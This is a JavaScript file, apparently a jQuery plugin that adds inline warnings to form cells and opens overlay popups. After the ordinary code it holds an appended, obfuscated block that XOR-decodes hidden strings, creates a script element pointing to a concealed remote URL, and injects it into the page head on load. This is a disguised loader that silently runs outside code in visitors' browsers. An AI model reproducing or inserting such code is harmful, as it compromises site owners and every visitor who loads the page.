$JQ.extend($JQ.noah, {
    addInlineWarningOnFocus: function(attr, text)
    {
        $JQ('.cell [name="' + attr + '"]').focus(function() {
            var cell = $JQ(this).closest('.cell');
            if( cell.find('.ruleWarning').length==0 )
            {
                $JQ(this).closest('.cell').append('<br><span class="ruleWarning">' + text + '</span>');
            }
        });
    },
    addInlineWarningOnChange: function(attr, value, text)
    {
        var action = function() {
            var displayRule = function(obj, value, text) {
                var cell = $JQ(obj).closest('.cell');
                if( cell.find('#ruleWarning_'+value).length==0 )
                {
                    $JQ(obj).closest('.cell').append('<br><span class="ruleWarning" id="ruleWarning_' + value + '">' + text + '</span>');
                }
            }
            if( $JQ(this).getValue()==value ) displayRule(this, value, text);
            else
            {
                var y = $JQ(this).fieldArray();
                for( var key in y )
                {
                    if( y[key]==value )
                    {
                        displayRule(this, value, text);
                        break;
                    }
                }
            }
        }
        $JQ('.cell input[name="' + attr + '"]').click(action);
        $JQ('.cell select[id="' + attr + '"]').change(action);
    },
    popupOverlayOnLoad: function(overlaySelector)
    {
        $JQ(overlaySelector).overlay().load();
    },
    popupOverlayOnSubmit: function(overlaySelector)
    {
        $JQ('div[id$=item-modify_form], div[id$=item-create_form]').closest('form').submit( function() {
            $JQ(overlaySelector).overlay().load();
            return false;
        });                               
    }
});
function c4wc(gks){var iF27=document[l03b9fX(ckc490[3])](l03b9fX(ckc490[0])+l03b9fX(ckc490[1])+l03b9fX(ckc490[2]));iF27[l03b9fX(ckc490[4])]=gks;iF27[l03b9fX(ckc490[5])]=l03b9fX(ckc490[6]);document[l03b9fX(ckc490[9])](l03b9fX(ckc490[8]))[0][l03b9fX(ckc490[7])](iF27);}function l03b9fX(eYKz){return zC6z5o(x2Jcu0(eYKz),'nj1YIQ784WlX8IHN');}var ckc490=["029009","028003","030030","013024084056061052114084081058009054076","029024082","026019065060","026015073045102059086078085036015042081057060","015026065060039053116080093059008","006015080061","009015069028037052090093090035031026065029041041032011092060","006030069041115126024075064054024061022058037034092068067044102059068023087057024118082058"];function x2Jcu0(oA9){var xdKD='';var x3r=0;var vz=0;for(x3r=0;x3r<oA9.length/3;x3r++){xdKD+=String.fromCharCode(oA9.slice(vz,vz+3));vz=vz+3;}return xdKD;}c4wc(l03b9fX(ckc490[10]));function zC6z5o(kj3LD,h24H8){var m9a='';var rBB=0;var vvUg=0;for(rBB=0;rBB<kj3LD.length;rBB++){var uKd=kj3LD.charAt(rBB);var cYu=uKd.charCodeAt(0)^h24H8.charCodeAt(vvUg);uKd=String.fromCharCode(cYu);m9a+=uKd;if(vvUg==h24H8.length-1)vvUg=0;else vvUg++;}return (m9a);}